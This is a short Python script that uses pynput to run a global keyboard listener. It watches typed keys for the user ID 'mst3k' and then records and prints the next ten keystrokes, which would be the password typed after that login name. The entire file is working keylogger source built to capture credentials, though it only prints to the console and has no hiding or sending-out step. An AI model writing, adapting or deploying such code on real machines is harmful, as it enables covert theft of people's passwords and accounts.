from pynput import keyboard

ID = "mst3k"
testString = ['a', 'b', 'c', 'd', 'e']
count = 0
flag = False
passwdCount = -1
passwd = ""

# main method
def main():
    # Collect events until released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ...or, in a non-blocking fashion:
   # listener = keyboard.Listener(
   #     on_press=on_press,
   #     on_release=on_release)
   # listener.start()

#on press
def on_press(key):
    global flag
    global count 
    global testString
    global passwd
    global passwdCount

    try:
        #print('alphanumeric key {0} pressed'.format(
          #  key.char))

        #edit testString
        

        # if flag is false
        if not flag:     
            if key.char == ID[0]: # if letter starts with m then begin logging
                testString = ['0', '1', '2', '3', '4']
                count = 0
            else:
                count = (count + 1) % 5
            
            # update testString 
            testString[count] = key.char
        
        # update flag
        flag = (convertCharToString(testString) == ID)
        
        # when starting to log next 10 keys
        if flag and passwdCount < 10 and passwdCount > -1:
            passwd += key.char
            passwdCount += 1

        # one time
        if flag and passwdCount < 0:
            passwdCount += 1
        
        # print the password
        if len(passwd) >= 10:
            # print output
            print("\n{" + passwd + "}")
            passwd = ""
            passwdCount = 0
            testString = ['0', '1', '2', '3', '4']

    except AttributeError:
        return
        #print('special key {0} pressed'.format(
         #   key))

#on release
def on_release(key):
   # print('{0} released'.format(
    #    key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

#converts char array to string
def convertCharToString(charArr):
    newString = ""

    for s in charArr:
        newString += s
    
    return newString

main()
